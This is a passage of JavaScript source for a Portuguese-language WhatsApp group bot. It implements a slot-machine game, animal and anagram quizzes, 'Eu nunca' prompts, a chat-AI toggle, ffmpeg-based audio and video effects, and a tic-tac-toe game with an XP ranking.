'🔔 : 🔔 : 🍇',
'🍌 : 🍒 : 🔔',
'🍐 : 🔔 : 🔔',
'🍊 : 🍋 : 🍒',
'🍋 : 🍋 : 🍌',
'🔔 : 🔔 : 🍇',
'🔔 : 🍐 : 🍇',
'🔔 : 🔔 : 🔔',
'🍒 : 🍒 : 🍒',
'🍌 : 🍌 : 🍌'
]		  

const somtoy2 = sotoy[Math.floor(Math.random() * sotoy.length)]
if ((somtoy2 == '🥑 : 🥑 : 🥑') ||(somtoy2 == '🍉 : 🍉 : 🍉') ||(somtoy2 == '🍓 : 🍓 : 🍓') ||(somtoy2 == '🍎 : 🍎 : 🍎') ||(somtoy2 == '🍍 : 🍍 : 🍍') ||(somtoy2 == '🥝 : 🥝 : 🥝') ||(somtoy2 == '🍑 : 🍑 : 🍑') ||(somtoy2 == '🥥 : 🥥 : 🥥') ||(somtoy2 == '🍋 : 🍋 : 🍋') ||(somtoy2 == '🍐 : 🍐 : 🍐') ||(somtoy2 == '🍌 : 🍌 : 🍌') ||(somtoy2 == '🍒 : 🍒 : 🍒') ||(somtoy2 == '🔔 : 🔔 : 🔔') ||(somtoy2 == '🍊 : 🍊 : 🍊') ||(somtoy2 == '🍇 : 🍇 : 🍇')) {
var Vitória = "Você ganhou!!!"
} else {
var Vitória = "Você perdeu..."
}

const cassino = `
┏━━━━❪🎰❫━━━━
┣► ${somtoy2}◄┛
┗━━━━❪💰❫━━━━

*${Vitória}*`
  
sendBtext(from, `${cassino}`, `${Vitória}`, [
{buttonId: `${prefix}cassino`, buttonText: {displayText: `Proximo`}, type: 1}], selo)
break

case 'quizanimais':
if(!isGroup) return reply('Comando apenas para grupos')
const animaisquiz = Math.floor(Math.random() * quizanimais.length)
if(!isGroupAdmins) return reply('Comando apenas para admins')
if(args.length == 0) return reply('use 1 para ativar o jogo \npara desativar use quizanimais 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./armor/quizanim-${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./armor/quizanim-${from}.json`))
imagemtexto =`                             「❓Quiz❓」`
await conn.sendMessage(from, {image: {url: dataAnagrama2.foto}, caption: imagemtexto, thumbnail: dataAnagrama2.foto}, {quoted: selo})
} else {
fs.writeFileSync(`./armor/quizanim-${from}.json`, `${JSON.stringify(quizanimais[animaisquiz])}`)
imagemtexto =`                             「❓Quiz❓」`
await conn.sendMessage(from, {image: {url: dataAnagrama2.foto}, caption: imagemtexto, thumbnail: wew}, {quoted: selo})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./armor/quizanim-${from}.json`)) return reply('Não tem como desativar o jogo pôs ele não foi ativado')
fs.unlinkSync(`./armor/quizanim-${from}.json`)
reply("Desativado com sucesso")
}
await limitAdd(sender)
break

case 'anagrama':
if(!isGroup) return reply('comando apenas para grupos')
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if(!isGroupAdmins) return reply('comando apenas para admins')
if(args.length == 0) return reply('use 1 para ativar o jogo do anagrama\npara desativar use anagrama 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./armor/anagrama-${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./armor/anagrama-${from}.json`))
reply(`o jogo já foi iniciado neste grupo:
palavra: ${dataAnagrama2.embaralhada}
dica: ${dataAnagrama2.dica}
`)} else {
fs.writeFileSync(`./armor/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
conn.sendMessage(from, {text: `
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${palavrasANA[anaaleatorio].embaralhada}
│➽ DICA: ${palavrasANA[anaaleatorio].dica}
╰────────────────────────
`})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./armor/anagrama-${from}.json`)) return reply('não tem como desativar o jogo do anagrama pôs ele não foi ativado')
fs.unlinkSync(`./armor/anagrama-${from}.json`)
reply("desativado com sucesso")
}
await limitAdd(sender)
break

case 'revelaranime':
case 'revelaanime':  
if (!isGroupAdmins) return reply('somente adms')
let dataAnagrama = JSON.parse(fs.readFileSync(`./armor/quizanime-${from}.json`))
reply (`${dataAnagrama.original}`)
break

case 'revelaranimal':
case 'revelaanimal':  
if (!isGroupAdmins) return reply('somente adms')
let dataAnagramaa = JSON.parse(fs.readFileSync(`./armor/quizanim-${from}.json`))
reply (`${dataAnagramaa.original}`)
break

//=======(FIM-BRINCADEIRAS-JOGOS)========\\
case 'eununca': {

	const perg = (eununca[Math.floor(Math.random() * eununca.length)])
let buttons = [
                    {buttonId: `${prefix}ja`, buttonText: {displayText: 'Eu já'}, type: 1},
                    {buttonId: `${prefix}nunca`, buttonText: {displayText: `Eu nunca`}, type: 1},
                   {buttonId: `${prefix}eununca`, buttonText: {displayText: '🗣 Próxima Pergunta! 💥'}, type: 1}]
                let bb = {

                    text: `${perg}`,

                    footer: `By: ${setting.NomeDoBot}`,

                    buttons: buttons,

                    headerType: 2

                }

                conn.sendMessage(from, bb, {quoted: info})

            }
break

case 'ja': {
let aa = [

                    {buttonId: `${prefix}eununca`, buttonText: {displayText: '🗣 Próxima Pergunta! 💥'}, type: 1}]

                let bb = {

                    text: `Rapaz nem vou comentar nada pq se eu falar tô errada.`,

                    footer: `By: ${setting.NomeDoBot}`,

                    buttons: aa,

                    headerType: 2

                }

                conn.sendMessage(from, bb, {quoted: info})

            }

break

case 'nunca': {
let aa = [

                    {buttonId: `${prefix}eununca`, buttonText: {displayText: '🗣 Próxima Pergunta! 💥'}, type: 1}]

                let bb = {

                    text: `Finalmente um santinho por aqui ou está fingindo hein? 😳`,

                    footer: `By: ${setting.NomeDoBot}`,

                    buttons: aa,

                    headerType: 2

                }

                conn.sendMessage(from, bb, {quoted: info})

            }

break

//=(CASE-SIMIH-INTELIGÊNCIA-ARTIFICIAL)=\\

case 'luixbot':
if(isSimi) return reply('Desativado')
text = args.join(" ")
data = await fetchJson(`https://api.brizaloka-api.tk/ia/simsimi?apikey=brizaloka&text=${text}`, {method: 'get'})
simi = `${data.success}`  
reply(simi)
break

case 'simih':
if(!SoDono) return reply("Só dono pode executar esta ação...")
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isSimi) return reply('O modo Simi está ativo')
samih.push(from)
fs.writeFileSync('./datab/usuarios/simi.json', JSON.stringify(samih))
reply('Ativado com sucesso o modo simi neste grupo 😗')
} else if (Number(args[0]) === 0) {
if(!isSimi) return reply('Já está Desativado.')
samih.splice(from, 1)
fs.writeFileSync('./datab/usuarios/simi.json', JSON.stringify(samih))
reply('Desativado modo simi com sucesso neste grupo 😡️')
} else {
reply('1 para ativar, 0 para desativar, lerdao vc em KKKKK')
}
break

//========================================\\


//==(AUDIOS/DE-MUSICA/ZOUEIRA/ETC..)===\\

case 'bot': 
conn.sendMessage(from, { react: { text: `😡`, key: info.key }})
conn.sendMessage(from, {sticker: fs.readFileSync(`./pixkk.webp`)}, {quoted: selo2});
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/bot.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: selo2})
}
break

case 'infobot':
const cmdoo = fs.readFileSync('audios/infobot.mp3')
await conn.sendMessage(from, {audio: cmdoo, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
break 

//=======================================\\


//=====(ALTERADOR-DE-AUDIO/VIDEO)=======\\

case 'videocontrario':
case 'reversevid':
if ((isMedia && isQuotedVideo) && args.length == 0) {
reply(enviar.espere)
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
conn.sendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque um vídeo..")
}
break 

case 'videolento':
case 'slowvid':  
if ((isMedia && isQuotedVideo) && args.length == 0) {
reply(enviar.espere) 
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
conn.sendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: info })
fs.unlinkSync(ran)
})
} else {
reply("Marque um vídeo..")
}
break

case 'videorapido':
case 'fastvid':  
if ((isMedia && isQuotedVideo) && args.length == 0) {
reply(enviar.espere)
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
conn.sendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: info })
fs.unlinkSync(ran)
})	
} else {
reply("Marque o vídeo..")
}
break

case 'grave2':
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio..")
}
break

case 'grave':
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio..")
}
break

case 'adolesc':
case 'vozmenino':  
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio..")
}
break  

case 'tomp3': case 'viraraudio':
if ((isMedia && !info.message.imageMessage || isQuotedVideo)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.videoMessage
reply(enviar.espere)
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane 
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => { 
fs.unlinkSync(media)
if (err) return reply('❌ Falha ao converter vídeo para mp3 ❌')
buffer = fs.readFileSync(ran)
conn.sendMessage(from, {audio: buffer, mimetype: 'audio/mp4'}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o vídeo para transformar em áudio por favor..")
}
break
case 'bass3':
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio..")
}
break

case 'bass': 
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio..")
}
break

case 'bass2': 
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio..")
}
break

case 'estourar': 
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=90:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio..")
}
break

case 'fast':
case 'audiorapido':  
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Erro')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio...")
}
break

case 'esquilo':
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio...")
}
break

case 'audiolento': 
case 'slow':
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
conn.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
})
} else {
reply("Marque o áudio..")
}
break

//=========(FIM-ALTERAR-AUDIO)===========\\


//=======(JOGO-DA-VELHA-COM-MAQUINA)=======\\

case 'tttme':
if (!isGroup) return reply('SÓ EM GRUPO')
const checkTTTIdMe = getTTTId(sender)
if (checkTTTIdMe === undefined) addTTTId(sender)
conn.sendMessage(from, {text: tttme(pushname, getTTTwins(sender), getTTTdefeats(sender), getTTTties(sender), getTTTpoints(sender))}, {quoted: info})
break

case 'tttrank':
if (!isGroup) return reply(enviar.msg.grupo)
tictactoe.sort((a, b) => (a.points < b.points) ? 1 : -1)
mentioned_jid = []
let board = '*🔥Ranking dos melhores players🔥*\n\n'
try {
for (let i = 0; i < 3; i++) {
if (i == 0) {board += `${i + 1}º 🥇 : @${tictactoe[i].id.split('@')[0]}\n➻❥ *Ganhou: ${tictactoe[i].wins}*\n➻❥ *Perdeu: ${tictactoe[i].defeats}*\n➻❥ *Empates: ${tictactoe[i].ties}*\n*➻❥ Pontuação: ${tictactoe[i].points}*\n\n`

} else if (i == 1) {board += `${i + 1}º 🥈 : @${tictactoe[i].id.split('@')[0]}\n➻❥ *Ganhou: ${tictactoe[i].wins}*\n➻❥ *Perdeu: ${tictactoe[i].defeats}*\n➻❥ *Empates: ${tictactoe[i].ties}*\n*➻❥ Pontuação: ${tictactoe[i].points}*\n\n`
  
} else if (i == 2) {board += `${i + 1}º 🥉 : @${tictactoe[i].id.split('@')[0]}\n➻❥ *Ganhou: ${tictactoe[i].wins}*\n➻❥ *Perdeu: ${tictactoe[i].defeats}*\n➻❥ *Empates: ${tictactoe[i].ties}*\n*➻❥ Pontuação: ${tictactoe[i].points}*\n\n`
  
}
mentioned_jid.push(tictactoe[i].id)
} 
mentions(board, mentioned_jid, true)
} catch (err) {
console.log(err)
await conn.sendMessage(from, {text: `*É necessário 3 jogadores para se construir um ranking*`}, {quoted: info})
}
break

case 'jogar':
tttset.playertest = sender
if (!isGroup) {
reply(ptbr.group())
} else if (tttset.tttstatus == "off") {
reply(`*O jogo não foi iniciado*\n*Digite ${prefix}ttt <dificukdade> para iniciar*`)
} else if (tttset.player != tttset.playertest) {
reply(`*O jogo já foi iniciado por outro player, aguarde ele terminar...*`)
  
} else if (tttset.tttantibug == "on") {
reply(`Aguarde a ação anterior ser concluída...`)

} else {
tttset.tttantibug = "on"
const coordX = args
if (coordX != 'a1' && coordX != 'a2' && coordX != 'a3' &&
coordX != 'b1' && coordX != 'b2' && coordX != 'b3' && coordX != 'c1' && coordX != 'c2' && coordX != 'c3') {
reply(`*Diga a cordenada*\nExemplo: ${prefix}jogar a1`)
tttset.tttantibug = "off"
} else {
  
switch (args[0]) {
  
case 'a1':
if (esp.a1 != "🔲") {
reply('*Esse espaço ja foi marcado, tente outro')
} else {
esp.a1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break

case 'a2':
if (esp.a2 != "🔲") {
reply('*Esse espaço ja foi marcado, tente outro')
} else {
esp.a2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break

case 'a3':
if (esp.a3 != "🔲") {
reply('*Esse espaço ja foi marcado, tente outro')
} else {
esp.a3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break

case 'b1':
if (esp.b1 != "🔲") {
reply('*Esse espaço ja foi marcado, tente outro')
} else {
esp.b1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
                
case 'b2':
if (esp.b2 != "🔲") {
reply('*Esse espaço ja foi marcado, tente outro')
} else {
esp.b2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
                
case 'b3':
if (esp.b3 != "🔲") {
reply('*Esse espaço ja foi marcado, tente outro')
} else {
esp.b3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
                
case 'c1':
if (esp.c1 != "🔲") {
 reply('*Esse espaço ja foi marcado, tente outro')
} else {
esp.c1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
                
case 'c2':
if (esp.c2 != "🔲") {
reply('*Esse espaço ja foi marcado, tente outro')
} else {
esp.c2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
                
case 'c3':
if (esp.c3 != "🔲") {
reply('*Esse espaço ja foi marcado, tente outro')
} else {
esp.c3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break

}
tttset.reActivate1 = "on"
reply(`🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`)
var randomTTTXP = 0
            
if (WinnerX()) {
if (isCmd) {
switch (tttset.tttdifficulty) {
              
case "EASY":
randomTTTXP = Math.floor(Math.random() * 25) + 25
addLevelingXp(tttset.player, randomTTTXP)
break

case "NORMAL":
randomTTTXP = Math.floor(Math.random() * 75) + 75
addLevelingXp(tttset.player, randomTTTXP)
break

case "HARD":
randomTTTXP = Math.floor(Math.random() * 200) + 200
addLevelingXp(tttset.player, randomTTTXP)
break
                
case "IMPOSSIBLE":
randomTTTXP = Math.floor(Math.random() * 1000) + 1000
addLevelingXp(tttset.player, randomTTTXP)
break
}
conn.sendMessage(from, {text: `*VOCÊ VENCEU, PARABENS*\n\n *VOCÊ GANHOU ${randomTTTXP}XP*`})
} else {
conn.sendMessage(from,{text: `*VOCÊ VENCEU, PARABENS*`},)
}

const currentTTTwins = getTTTwins(tttset.player)
const checkTTTIdWin = getTTTId(tttset.player)
if (currentTTTwins === undefined && checkTTTIdWin === undefined) addTTTId(tttset.player)
addTTTwin(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (WinnerO()) {
				  
if (isCmd) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = 0 - (Math.floor(Math.random() * 200) + 200)
addLevelingXp(tttset.player, randomTTTXP)
break
					
case "NORMAL":
randomTTTXP = 0 - (Math.floor(Math.random() * 75) + 75)
addLevelingXp(tttset.player, randomTTTXP)
break
					
case "HARD":
randomTTTXP = 0 - (Math.floor(Math.random() * 25) + 25)
addLevelingXp(tttset.player, randomTTTXP)
break
					
case "IMPOSSIBLE":
randomTTTXP = 0
addLevelingXp(tttset.player, randomTTTXP)
break

}	
conn.sendMessage(from, {text: `*Você perdeu*\n\n AGORA VC PAGARÁ: ${randomTTTXP}XP`})
	
} else {
conn.sendMessage(from, {text: `*Você perdeu*`})
}
const currentTTTdefeats = getTTTdefeats(tttset.player)
const checkTTTIdDefeat = getTTTId(tttset.player)
if (currentTTTdefeats === undefined && checkTTTIdDefeat === undefined) addTTTId(tttset.player)
addTTTdefeat(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
				
} else if (Tie()) {
if (isCmd) {
conn.sendMessage(from, {text: `*JOGO EMPATADO, NÃO HOUVE PERDAR*`})
} else {
conn.sendMessage(from, {text: `*JOGO, EMPATADO, TENHA UM BOM DIA*`})
}

const currentTTTties = getTTTties(tttset.player)
const checkTTTIdTie = getTTTId(tttset.player)
if (currentTTTties === undefined && checkTTTIdTie === undefined) addTTTId(tttset.player)
addTTTtie(tttset.player, 1)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
}
tttset.tttantibug = "off"
}
}
break
				
case 'ttt':
const limitrl = getLimit(sender, daily)
if (!isGroup) {
reply(enviar.espere)
} else if (tttset.tttstatus == "on") {
reply(`Alguém já está jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.waitingTime == "on") {
reply(`Alguém jogou recentemente\nPor favor aguarde o tempo de espera...`)
} else if (args == 0 || (args != 'easy' && args != 'Easy' && args != 'EASY' && args != 'normal' && args != 'Normal' && args != 'NORMAL' && args != 'hard' && args != 'Hard' && args != 'HARD'&& args != 'impossible'&& args != 'Impossible' && args != 'IMPOSSIBLE')) {
reply(`Defina a dificuldade\nEx.: ${prefix}ttt easy\n\nDificuldades: easy, normal, hard e impossible`)

} else {
tttset.tttstatus = "on"
tttset.player = sender
tttset.playerName = pushname
tttset.mentionPlayer = info
tttset.local = from
if (args == 'easy' || args == 'Easy' || args == 'EASY') {
tttset.tttdifficulty = "EASY"
} else if (args == 'normal' || args == 'Normal' || args == 'NORMAL') {
tttset.tttdifficulty = "NORMAL"
} else if (args == 'hard' || args == 'Hard' || args == 'HARD') {
tttset.tttdifficulty = "HARD"
} else if (args == 'impossible' || args == 'Impossible' || args == 'IMPOSSIBLE') {
tttset.tttdifficulty = "IMPOSSIBLE"
}
const randomStartIA = Math.floor(Math.random() * 3)
if (randomStartIA == 0) {
IA()
tttset.reActivate1 = "on"	
}
blat =  `🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`
conn.sendMessage(from, {text: `${blat}\n\nCaso não saiba como jogar digite: ${prefix}ttthelp`})
setTimeout( () => {
tttset.waitingTime = "off"
tttset.autoEndTime = "on"
}, 12000) //2 minutos
addLimit(sender, daily)
}
break

case 'ttthelp':
conn.sendMessage(from, {text: ttthelp(prefix)})
break
//==========(EFEITOS-MARCAR)==========\\

case 'triggered':
try {
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo : info.message.imageMessage
imagem = await downloadContentFromMessage(boij, 'image')
owgi = Buffer.from([])
for await(const send of imagem) { owgi = Buffer.concat( [ owgi, send ] ) }
res = await upload(owgi)
post = await fetchJson(`http://apis.bronxyshost.com/api-bronxys/trigger?url=${res}&apikey=@Luix1397`)
sendStickerFromUrl(from, {sticker: post}, {quoted:info})
} else {
reply('Marque a imagem')
}
} catch (e) {
if(String(e).includes(Luix1397)) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'togif':
if (!isQuotedSticker) return reply('*[ ❗ ] Marque a figurinha animada!*')
if ((isMedia && !info.message.videoMessage || isQuotedSticker) && args.length == 0) {
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
reply('*「 ❗ 」 Aguarde, convertendo a figu em gif...*')
a = await webp_mp4(buff)
conn.sendMessage(from, {video: {url: a}, gifPlayback: true, fileName: `stick.gif`}, {quoted: info})
